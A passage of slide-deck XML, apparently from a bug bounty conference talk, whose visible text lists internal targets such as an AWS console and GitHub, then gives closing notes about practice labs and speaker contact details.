                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2300"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>AWS Console</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-374650" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2300"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Github</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-374650" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2300"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Customer Search tool</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-374650" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2300"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>A buttload of internal applications</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="835" name="Shape 835"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="836" name="Google Shape;836;p100"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8795100" cy="2970600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Bug bounties are a great place to just hack industries you would never get to otherwise</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Most of these will be available in a form of labs to Hackinghub.io to try on your own for  free</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Come talk to us outside</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>of the room for any questions </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Connect with us on socials: @nahamsec @hacker_</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="837" name="Google Shape;837;p100"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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8" name="Google Shape;838;p100"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="839" name="Google Shape;839;p100"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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
        <p:nvSpPr>
          <p:cNvPr id="840" name="Google Shape;840;p100"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1041700" y="266850"/>
            <a:ext cx="6902400" cy="723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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Final Notes</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="844" name="Shape 844"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="845" name="Google Shape;845;p101"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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6" name="Google Shape;846;p101"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="847" name="Google Shape;847;p101"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="774450" y="1940700"/>
            <a:ext cx="7595100" cy="16008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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Thank you</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>@NahamSec | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>Ben@nahamsec.com</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>@hacker_ </a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>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